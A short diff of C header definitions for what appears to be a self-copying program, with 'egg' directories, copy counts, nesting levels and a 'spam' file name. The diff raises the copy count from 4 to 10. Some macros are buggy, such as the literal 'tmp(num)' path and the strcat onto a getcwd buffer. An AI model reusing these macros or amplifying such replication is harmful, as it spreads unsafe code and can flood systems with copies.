@@ -8,7 +8,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <math.h>
-#include <pthread.h>
 #include <string.h>
 #include <unistd.h>
 #include <limits.h>
@@ -22,11 +21,7 @@
 #include "broadcaster.h"
 
 
-
-
 #define LINESIZE 1024
-
-#define MAX_ARGV_SIZE 100
 
 #define INITDIR (strcat(getcwd(0,LINESIZE),"/"))
 
@@ -40,10 +35,12 @@
 #define TMP_FILE_PATH(cwd,num) (strcat(cwd,"tmp(num)"))
 
 #define EGG_DIR_NAME "new/"
+#define SUB_EGG_DIR_NAME "stopthis"
+#define SPAM_FILE_NAME "helpme"
 #define EGG_DIR_PATH(cwd) (strcat(cwd,EGG_DIR_NAME))
 #define EGG_DIR_PATH_INC (strlen(EGG_DIR_NAME))
 
-#define HOW_MANY_COPIES 4
+#define HOW_MANY_COPIES 10
 #define MAX_LEVELS 10
 #define SEC_IN_US 1000000
 
